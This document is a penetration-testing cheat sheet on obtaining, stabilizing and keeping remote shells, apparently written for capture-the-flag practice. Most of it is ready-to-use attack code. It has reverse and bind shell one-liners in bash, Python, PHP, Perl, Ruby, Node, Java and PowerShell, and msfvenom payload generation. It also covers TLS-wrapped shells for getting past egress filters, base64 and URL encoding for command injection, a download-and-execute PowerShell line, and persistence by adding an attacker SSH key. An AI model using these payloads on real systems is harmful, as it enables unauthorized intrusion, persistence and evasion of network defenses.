# 05 — Shells, Listeners & Stabilization

The mechanics of getting a shell, keeping a shell, and turning a janky shell into a usable one.

---

## 1. Listener Setup

### 1.1 Plain netcat
```bash
nc -lnvp 4444                  # OG, no rlwrap nightmare
rlwrap nc -lnvp 4444           # arrow keys + history
rlwrap -cAr nc -lnvp 4444      # color, raw mode
```

### 1.2 ncat (better TLS support)
```bash
ncat -lnvp 4444
ncat -lnvp 4444 --ssl          # encrypted
ncat -lnvp 4444 -e /bin/bash   # bind shell (don't use on real engagements)
```

### 1.3 pwncat-cs (best for daily use)
```bash
pip install pwncat-cs   # or: pipx install pwncat-cs
pwncat-cs -lp 4444
```
On connect, pwncat-cs auto-stabilizes the TTY, syncs history, supports tab-completion, file uploads, persistence modules. Strongly recommended.

### 1.4 Metasploit handler
```
msf6> use exploit/multi/handler
msf6> set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf6> set LHOST <atk>
msf6> set LPORT 4444
msf6> set ExitOnSession false
msf6> run -j
```
Use Meterpreter when you want auto-pivoting, port forwarding, screenshot, mimikatz integration. Otherwise the simpler shells are usually enough.

### 1.5 Encrypted shell (egress filtered networks)
**Attacker:**
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=x'
openssl s_server -quiet -key key.pem -cert cert.pem -port 443
```
**Target:**
```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <atk>:443 > /tmp/s; rm /tmp/s
```

---

## 2. Reverse Shell Payloads

Replace `<atk>` and `<port>` with your attacker IP/port. Use https://revshells.com/ for instant generation in many languages.

### 2.1 Bash
```bash
bash -c 'bash -i >& /dev/tcp/<atk>/<port> 0>&1'
bash -c 'exec bash -i &>/dev/tcp/<atk>/<port> <&1'
0<&196;exec 196<>/dev/tcp/<atk>/<port>; sh <&196 >&196 2>&196
```

### 2.2 sh / dash (no bash)
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <atk> <port> >/tmp/f
```

### 2.3 nc / ncat
```bash
nc <atk> <port> -e /bin/bash                       # only with traditional nc
ncat <atk> <port> -e /bin/bash --ssl
nc <atk> <port> | /bin/bash | nc <atk> <port2>     # split-port if -e missing
```

### 2.4 Python
```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<atk>",<port>));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("bash")'
# python2:
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<atk>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### 2.5 PHP
```bash
php -r '$s=fsockopen("<atk>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
# or
php -r '$s=fsockopen("<atk>",<port>);$p=proc_open("/bin/sh -i", array(0=>$s,1=>$s,2=>$s),$a);'
```

### 2.6 Perl
```perl
perl -e 'use Socket;$i="<atk>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### 2.7 Ruby
```ruby
ruby -rsocket -e 'spawn("sh",[:in,:out,:err]=>TCPSocket.new("<atk>",<port>))'
```

### 2.8 Node.js
```javascript
require('child_process').exec('bash -c "bash -i >& /dev/tcp/<atk>/<port> 0>&1"')
```

### 2.9 Java
```java
String host="<atk>"; int port=<port>; String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();
```

### 2.10 PowerShell (Windows)
```powershell
$c=New-Object Net.Sockets.TCPClient('<atk>',<port>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()}
```
Encoded one-liner (UTF-16LE → base64) is what you'll usually paste:
```bash
echo -n '<the powershell above>' | iconv -t UTF-16LE | base64 -w 0
# then on target:
powershell -e <BASE64>
```

### 2.11 Windows native (no PowerShell)
```cmd
\\<atk>\share\nc.exe <atk> <port> -e cmd.exe
```
(Stage `nc.exe` via SMB share or impacket-smbserver.)

---

## 3. Bind Shell Payloads (when target can't egress)

Bind shells listen *on the target* and you connect *to* them.

### 3.1 Bash
```bash
nc -lvp 4444 -e /bin/bash                 # traditional nc
ncat -lvp 4444 -e /bin/bash               # ncat
mkfifo /tmp/f; nc -lvp 4444 < /tmp/f | /bin/sh > /tmp/f; rm /tmp/f
```
**Connect**: `nc <target> 4444`

### 3.2 Python
```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.bind(("",4444));s.listen(1);c,_=s.accept();[os.dup2(c.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
```

---

## 4. msfvenom Payload Generation

```bash
# Linux x64 staged Meterpreter
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<atk> LPORT=4444 -f elf -o sh

# Windows x64 staged Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<atk> LPORT=4444 -f exe -o sh.exe

# Stageless (more reliable across NAT)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<atk> LPORT=4444 -f elf -o sh

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<atk> LPORT=4444 -f war -o sh.war

# PHP
msfvenom -p php/reverse_php LHOST=<atk> LPORT=4444 -f raw -o sh.php

# ASPX
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<atk> LPORT=4444 -f aspx -o sh.aspx

# Linux ELF, x86 (older boxes)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<atk> LPORT=4444 -f elf -o sh32

# Powershell raw command
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<atk> LPORT=4444 -f psh -o sh.ps1

# Encoded base64 PowerShell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<atk> LPORT=4444 -f psh-cmd
```

---

## 5. URL-encoding Reverse Shells

When your shell flies through a URL (LFI, command injection):
```bash
python3 -c "import urllib.parse,sys;print(urllib.parse.quote(open(sys.argv[1]).read()))" payload.sh
```
Or compact double-encoding for picky parsers:
```bash
echo -n 'bash -c "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"' | jq -sRr @uri | jq -sRr @uri
```

Or base64 + decode-on-target:
```bash
PAYLOAD='bash -c "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"'
echo "$PAYLOAD" | base64 -w 0
# inject as: ;echo <B64>|base64 -d|bash
```

---

## 6. Stabilizing a Linux Shell (do this every time)

You catch a shell. It works, but Ctrl-C kills it, arrow keys print escape codes, vim is unusable. Fix it:

### 6.1 Method 1 — Python PTY (most common)
```bash
# in the shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'
# or python (2):
python -c 'import pty;pty.spawn("/bin/bash")'

# Ctrl+Z   (background)
# back on attacker:
stty raw -echo; fg
# in the shell:
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 50 columns 200       # or your real size; check with `stty size` on attacker
```

### 6.2 Method 2 — script (when no python)
```bash
script -qc /bin/bash /dev/null
```

### 6.3 Method 3 — socat (if socat on target)
**Attacker:**
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
**Target:**
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<atk>:4444
```
Result: full PTY out of the box. If you can stage `socat` on the target, do this.

### 6.4 Method 4 — pwncat-cs
Catches shell, auto-stabilizes, instantly pretty:
```bash
pwncat-cs -lp 4444
```

### 6.5 Common stuck states

- "Ctrl-C kills my shell" → you forgot `stty raw -echo; fg`.
- "Tab doesn't complete" → you forgot `export TERM=xterm-256color`.
- "less / vim show garbled output" → set rows/columns: `stty rows 50 columns 200`.
- "I closed the terminal and lost the shell" → use `tmux` for the listener, not a raw terminal.

---

## 7. Stabilizing a Windows Shell

CMD/PowerShell shells via `nc` are messy. Options:

### 7.1 Use Conpty / better stagers
- **ConPtyShell** (https://github.com/antonioCoco/ConPtyShell) — full PTY for modern Windows.
```bash
# attacker:
stty raw -echo; (stty size; cat) | nc -lvnp 4444
# target (PowerShell):
IEX(IWR http://<atk>/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <atk> 4444 -Rows 50 -Cols 200
```

### 7.2 Switch to WinRM / RDP after credential harvest
A WinRM session via `evil-winrm` is dramatically nicer than a raw reverse shell. As soon as you have admin or any account in `Remote Management Users`, jump.

### 7.3 Switch to Meterpreter
If a CMD shell is unbearable:
```
msf6> sessions -u <id>      # upgrade to Meterpreter
```
Or stage in a Meterpreter binary via the existing shell.

---

## 8. Backgrounding & Multiplexing

Use `tmux`. Always.

`~/.tmux.conf` minimum:
```
set -g mouse on
set-option -g history-limit 50000
set -g default-terminal "screen-256color"
unbind C-b; set -g prefix C-a; bind C-a send-prefix
```

Per-box session:
```bash
tmux new -s <box>
# panes: scan | shell | notes | file-server
# split: Ctrl-a "  (horiz)   Ctrl-a %  (vert)
# nav:   Ctrl-a arrow
# detach Ctrl-a d ; reattach: tmux attach -t <box>
```

Logging a pane:
```
Ctrl-a : pipe-pane -o 'cat >> ~/htb/<box>/term.log'
```
Now everything you see is also on disk.

---

## 9. Persistence Through Reconnects

Shells die. Networks blip. Some practical defenses:

- Keep a `while true; do nc -lvp 4444; done` loop so you can re-catch instantly.
- After foothold, drop a second shell on a different port — redundancy.
- Add an SSH key to a writable user when you can — by far the most stable shell.
```bash
mkdir -p /home/foo/.ssh
chmod 700 /home/foo/.ssh
echo 'ssh-ed25519 AAAA... attacker' >> /home/foo/.ssh/authorized_keys
chmod 600 /home/foo/.ssh/authorized_keys
chown -R foo:foo /home/foo/.ssh
```
- On Windows, after foothold: get a hash, use `evil-winrm`. SSH `nc.exe` is a stopgap.

---

## 10. When Outbound Is Filtered

The most common ports the target can usually reach the attacker on (in order of likelihood):
- 80, 443 (almost always)
- 53 (DNS, often)
- 8080, 8443
- 21, 22 (sometimes)

Strategies:
- Listen on 443 with TLS (looks like normal HTTPS).
- DNS exfil for blind use cases (interactsh, dnscat2).
- Stage shell over HTTPS with `socat openssl-listen` or `openssl s_server`.

---

## 11. When Inbound Is Filtered (use bind shells)

If target's outbound is fully blocked but you can reach in:
```bash
# target:
mkfifo /tmp/f; nc -lvp 4444 < /tmp/f | /bin/sh > /tmp/f; rm /tmp/f
# attacker:
nc <target> 4444
```

---

## 12. Anti-Patterns

- Catching a shell in a regular terminal pane → can't background, lose it on close.
- Forgetting `stty raw -echo; fg` → you'll keep killing your shell with Ctrl-C.
- Using a staged Meterpreter without a stable network — if the staging fails, the listener hangs.
- Not setting `TERM` and `stty size` — vim will be unusable.
- Running `python` on a target without checking which Python (2 vs 3) exists. `python --version` first.

---

## 13. The "Catch and Polish" Sequence (memorize this)

```bash
# attacker terminal A (in tmux):
rlwrap nc -lnvp 4444

# fire payload from somewhere

# in the catch:
which python || which python3
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Ctrl-Z

# in attacker:
stty raw -echo; fg

# back in shell:
export TERM=xterm-256color
stty rows 50 columns 200      # match your terminal

# now you have a real shell. Sanity check:
id
hostname
uname -a
```

---

*A shell you can't drive is wasted access. Stabilize first, exploit second.*
